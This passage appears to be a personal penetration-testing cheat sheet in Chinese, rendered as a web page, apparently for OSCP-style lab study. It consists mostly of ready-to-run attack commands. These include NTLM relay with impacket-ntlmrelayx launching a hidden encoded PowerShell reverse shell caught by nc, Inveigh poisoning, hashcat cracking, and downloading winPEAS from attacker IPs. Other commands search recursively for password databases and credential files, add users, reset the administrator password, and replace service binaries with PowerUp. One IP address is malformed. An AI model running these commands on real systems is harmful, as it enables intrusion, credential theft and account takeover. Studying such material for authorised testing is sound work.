</span></span><span class="line"><span class="cl">Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### netntlmv2中继  跳板机可以执行命令，目标机正在以本地管理员登录并且密码和js一样 需要目标禁用UAC</span>
</span></span><span class="line"><span class="cl">	crackmapexec扫描结果显示false代表可能可以用中继攻击
</span></span><span class="line"><span class="cl">	impacket-ntlmrelayx --no-http-server -smb2support -t 目标机 -c <span class="s2">&#34;powershell -nop -w hidden -e reverseShell&#34;</span>
</span></span><span class="line"><span class="cl">	跳板机：dir <span class="se">\\</span>kaliip<span class="se">\t</span>est123
</span></span><span class="line"><span class="cl">	kali: nc  <span class="m">1234</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>hashcat</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">### 调试</span>
</span></span><span class="line"><span class="cl">hashcat -r upper.rule --stdout testword.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### md5破解</span>
</span></span><span class="line"><span class="cl">hashcat -m <span class="m">0</span> 19adc0e8921336d08502c039dc297ff8 ./testrockyou.txt -r upper.rule --force
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="win提权"><a href="#win提权" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>win提权</h2>
<h3 id="win信息收集"><a href="#win信息收集" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>win信息收集</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## 自动</span>
</span></span><span class="line"><span class="cl">	/usr/share/privilege/win/winPEASany.exe
</span></span><span class="line"><span class="cl"><span class="c1">## 手动</span>
</span></span><span class="line"><span class="cl">	主机名
</span></span><span class="line"><span class="cl">	ip
</span></span><span class="line"><span class="cl">	域
</span></span><span class="line"><span class="cl">	当前用户
</span></span><span class="line"><span class="cl">	当前用户组
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	密码管理器
</span></span><span class="line"><span class="cl">	
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>自动化工具</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">### winPEASx64.exe</span>
</span></span><span class="line"><span class="cl">	/usr/share/privilege/win/winPEASany.exe
</span></span><span class="line"><span class="cl">	ps&gt; iwr -uri http://192.168.45.2280.10.10.9:1111/winPEASany.exe -Outfile winpeas.exe
</span></span><span class="line"><span class="cl"><span class="c1">### Seatbelt</span>
</span></span><span class="line"><span class="cl">	/usr/share/privilege/win/Seatbelt.exe
</span></span><span class="line"><span class="cl">	./Seatbelt.exe -group<span class="o">=</span>all
</span></span><span class="line"><span class="cl"><span class="c1">### JAWS</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>powershell..帐号 程序 进程 敏感文件 相关</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">##信息收集</span>
</span></span><span class="line"><span class="cl">	<span class="p">-</span><span class="n">用户</span>
</span></span><span class="line"><span class="cl">	<span class="n">net</span> <span class="n">user</span> 
</span></span><span class="line"><span class="cl">	<span class="n">net</span> <span class="n">user</span> <span class="p">/</span><span class="n">domain</span>
</span></span><span class="line"><span class="cl">	<span class="p">-</span><span class="n">组</span>
</span></span><span class="line"><span class="cl">	<span class="n">net</span> <span class="n">localgroup</span> 
</span></span><span class="line"><span class="cl">	<span class="n">net</span> <span class="nb">group </span><span class="p">/</span><span class="n">domain</span>
</span></span><span class="line"><span class="cl">	<span class="p">%</span><span class="k">%</span><span class="n">net</span> <span class="n">localgroup</span> <span class="p">/</span><span class="n">domain</span><span class="p">%%</span>
</span></span><span class="line"><span class="cl">	<span class="p">-</span><span class="n">组用户</span>
</span></span><span class="line"><span class="cl">	<span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span>
</span></span><span class="line"><span class="cl">	<span class="n">net</span> <span class="nb">group </span><span class="s2">&#34;Domain Admins&#34;</span> <span class="p">/</span><span class="n">domain</span>
</span></span><span class="line"><span class="cl">	<span class="n">添加</span>
</span></span><span class="line"><span class="cl">	<span class="n">net</span> <span class="n">user</span> <span class="n">xxx</span> <span class="n">xxx</span> <span class="p">/</span><span class="n">add</span>
</span></span><span class="line"><span class="cl">	<span class="n">net</span> <span class="n">localgroup</span> <span class="s1">&#39;Remote Desktop Users&#39;</span> <span class="n">offsec</span> <span class="p">/</span><span class="n">add</span>
</span></span><span class="line"><span class="cl">	<span class="n">改密</span>
</span></span><span class="line"><span class="cl">	<span class="n">net</span> <span class="n">user</span> <span class="n">administrator</span> <span class="n">xxx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c">### 本地操作 域用户需要powerview</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Get-NetRoute</span>
</span></span><span class="line"><span class="cl">	    <span class="nb">Get-LocalUser</span>   
</span></span><span class="line"><span class="cl">	    <span class="nb">Get-localGroup</span>
</span></span><span class="line"><span class="cl">	    <span class="nb">Get-localgroupmember</span> <span class="n">Administrators</span>
</span></span><span class="line"><span class="cl">	    <span class="n">net</span> <span class="n">user</span> <span class="n">xxx</span> <span class="n">某人所属组</span>
</span></span><span class="line"><span class="cl">			<span class="n">帐号无法rdp就用ps</span><span class="p">&gt;</span> <span class="n">runas</span>
</span></span><span class="line"><span class="cl">			<span class="c">### 如果可以访问GUI，有帐号密码，可以用runas以另外用户身份执行命令</span>
</span></span><span class="line"><span class="cl">			<span class="n">runas</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">admin</span> <span class="n">cmd</span>
</span></span><span class="line"><span class="cl">	<span class="c">### 历史命令</span>
</span></span><span class="line"><span class="cl">		<span class="p">(</span><span class="nb">Get-PSReadlineOption</span><span class="p">).</span><span class="n">HistorySavePath</span>
</span></span><span class="line"><span class="cl">	<span class="nb">Get-History</span>
</span></span><span class="line"><span class="cl">	<span class="c">### 服务</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Get-Service</span> <span class="nb">Cmdlet或Get-CimInstance</span> <span class="n">Cmdlet</span>
</span></span><span class="line"><span class="cl">	<span class="c">### 网络</span>
</span></span><span class="line"><span class="cl">		<span class="n">cmd</span><span class="p">&gt;</span> <span class="n">netstat</span> <span class="n">-anp</span> <span class="n">TCP</span> <span class="p">|</span> <span class="n">find</span> <span class="s2">&#34;2222&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="c">### 个人权限</span>
</span></span><span class="line"><span class="cl">		<span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
</span></span><span class="line"><span class="cl">		<span class="n">whoami</span> <span class="p">/</span><span class="n">user</span>
</span></span><span class="line"><span class="cl">		<span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c">### 4104 powershell执行记录 </span>
</span></span><span class="line"><span class="cl">		<span class="n">eventvwr</span><span class="p">.</span><span class="n">msc</span> <span class="p">&gt;</span> <span class="n">application</span> <span class="n">and</span> <span class="n">service</span> <span class="p">&gt;</span> <span class="n">Microsoft</span> <span class="p">&gt;</span> <span class="n">Windows</span> <span class="p">&gt;</span> <span class="n">powershell</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">winpe</span><span class="p">..</span>
</span></span><span class="line"><span class="cl"><span class="c">###已安装的32b程序不全，检查2个目录：download、C://32位和64位Program Files</span>
</span></span><span class="line"><span class="cl">    <span class="nb">get-itemproperty</span> <span class="s2">&#34;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&#34;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
</span></span><span class="line"><span class="cl"><span class="c">###已安装的64b程序</span>
</span></span><span class="line"><span class="cl">    <span class="nb">get-itemproperty</span> <span class="s2">&#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&#34;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
</span></span><span class="line"><span class="cl"><span class="c">### 其他位置程序</span>
</span></span><span class="line"><span class="cl">	<span class="nb">get-itemproperty</span> <span class="s2">&#34;HKLM:\SOFTWARE\Microsoft\*&#34;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
</span></span><span class="line"><span class="cl">	<span class="n">download</span> 
</span></span><span class="line"><span class="cl">	<span class="n">C:</span><span class="p">//</span><span class="n">32位和64位Program</span> <span class="n">Files</span>
</span></span><span class="line"><span class="cl"><span class="c">###正在运行的进程</span>
</span></span><span class="line"><span class="cl">	<span class="nb">get-process</span> 
</span></span><span class="line"><span class="cl">	<span class="n">查看某个运行程序</span><span class="err">（</span><span class="n">或进程</span><span class="err">）</span><span class="n">的命令行参数</span>
</span></span><span class="line"><span class="cl">	<span class="n">cmd</span><span class="p">&gt;</span> <span class="n">wmic</span> <span class="k">process</span> <span class="n">get</span> <span class="n">caption</span><span class="p">,</span><span class="n">commandline</span> <span class="p">/</span><span class="n">value</span>
</span></span><span class="line"><span class="cl">	<span class="n">某一个进程的命令行参数</span><span class="err">，</span><span class="n">使用下列方式</span><span class="err">：</span>
</span></span><span class="line"><span class="cl">	<span class="n">cmd</span><span class="p">&gt;</span> <span class="n">wmic</span> <span class="k">process</span> <span class="nb">where </span><span class="n">caption</span><span class="p">=</span><span class="s2">&#34;xxx.exe&#34;</span> <span class="n">get</span> <span class="n">caption</span><span class="p">,</span><span class="n">commandline</span> <span class="p">/</span><span class="n">value</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">###搜索系统上的所有密码管理器数据库</span>
</span></span><span class="line"><span class="cl">	<span class="n">搜</span> <span class="p">*</span><span class="n">windows</span><span class="p">.</span><span class="n">old</span><span class="p">*</span> <span class="n">backup各种不常见文件</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">kdbx</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span></span><span class="line"><span class="cl"><span class="c">###搜索指定后缀名的文件 敏感信息</span>
</span></span><span class="line"><span class="cl">	<span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">git</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">xampp</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">txt</span><span class="p">,*.</span><span class="n">ini</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span> <span class="n">-Include</span> <span class="n">credentials</span><span class="p">.</span><span class="n">txt</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">adrian</span><span class="p">\</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">txt</span><span class="p">,*.</span><span class="n">pdf</span><span class="p">,*.</span><span class="n">xls</span><span class="p">,*.</span><span class="n">xlsx</span><span class="p">,*.</span><span class="n">doc</span><span class="p">,*.</span><span class="n">docx</span><span class="p">,*.</span><span class="n">ini</span><span class="p">,*.</span><span class="n">kdbx</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span> <span class="n">-Include</span> <span class="n">local</span><span class="p">.</span><span class="n">txt</span><span class="p">,</span><span class="n">proof</span><span class="p">.</span><span class="n">txt</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span></span><span class="line"><span class="cl"><span class="c">### 常用位置 ### 公共位置 ###</span>
</span></span><span class="line"><span class="cl">    <span class="n">C:</span><span class="p">\</span><span class="n">softName</span>
</span></span><span class="line"><span class="cl">    <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">userName</span>
</span></span><span class="line"><span class="cl">    <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">public</span>
</span></span><span class="line"><span class="cl">    <span class="p">*.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl">    <span class="p">*.</span><span class="n">ini</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">###查看正在运行的服务的信息</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span><span class="n">State</span><span class="p">,</span><span class="n">PathName</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">State</span> <span class="o">-like</span> <span class="s1">&#39;Running&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c">###查看正在运行的服务的启动类型</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span> <span class="n">StartMode</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-like</span> <span class="s1">&#39;Apache2.4everything&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">### 下载</span>
</span></span><span class="line"><span class="cl"><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">118</span><span class="p">.</span><span class="n">2</span><span class="p">/</span><span class="n">winPEASx64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Outfile</span> <span class="n">winPEAS</span><span class="p">.</span><span class="n">exe</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>WinRM</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## 加入Windows Management Users组的话，可以使用winrm进行powershell远程管理</span>
</span></span><span class="line"><span class="cl">注意转意
</span></span><span class="line"><span class="cl">evil-winrm  -i 10.10.10.4 -u user -p <span class="s2">&#34;qwe111\,\.\/&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### 下载文件 </span>
</span></span><span class="line"><span class="cl">		download 1.txt /root/Document/oscpA/ad/SYSTEM
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="win服务"><a href="#win服务" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>win服务</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># powerup使用</span>
</span></span><span class="line"><span class="cl">	<span class="nb">Invoke-AllChecks</span>
</span></span><span class="line"><span class="cl">	<span class="nb">Get-ModifiableService</span>
</span></span><span class="line"><span class="cl">	<span class="nb">Get-ModifiableFile</span>
</span></span><span class="line"><span class="cl">	<span class="nb">Get-ServiceUnquoted</span>
</span></span><span class="line"><span class="cl"><span class="p">---------</span>
</span></span><span class="line"><span class="cl"><span class="c">## exe劫持</span>
</span></span><span class="line"><span class="cl">	<span class="c">### 自动</span>
</span></span><span class="line"><span class="cl">		<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="nb">windows-resources</span><span class="p">/</span><span class="n">powersploit</span><span class="p">/</span><span class="n">Privesc</span><span class="p">/</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">		<span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span> 
</span></span><span class="line"><span class="cl">		<span class="p">.</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Get-ModifiableServiceFile</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 内置函数-替换服务：重启服务并添加账户john/Password123! </span>
</span></span><span class="line"><span class="cl">		<span class="nb">Install-ServiceBinary</span> <span class="n">-Name</span> <span class="s1">&#39;mysql&#39;</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 列安装的程序</span>
</span></span><span class="line"><span class="cl">			<span class="nb">ls </span><span class="s1">&#39;C:\Program Files&#39;</span>
</span></span><span class="line"><span class="cl">			<span class="c">###已安装的32b程序不全，检查2个目录：download、C://32位和64位Program Files</span>
</span></span><span class="line"><span class="cl">		    <span class="nb">get-itemproperty</span> <span class="s2">&#34;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&#34;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
</span></span><span class="line"><span class="cl">		<span class="c">###已安装的64b程序</span>
</span></span><span class="line"><span class="cl">		    <span class="nb">get-itemproperty</span> <span class="s2">&#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&#34;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 其他位置程序</span>
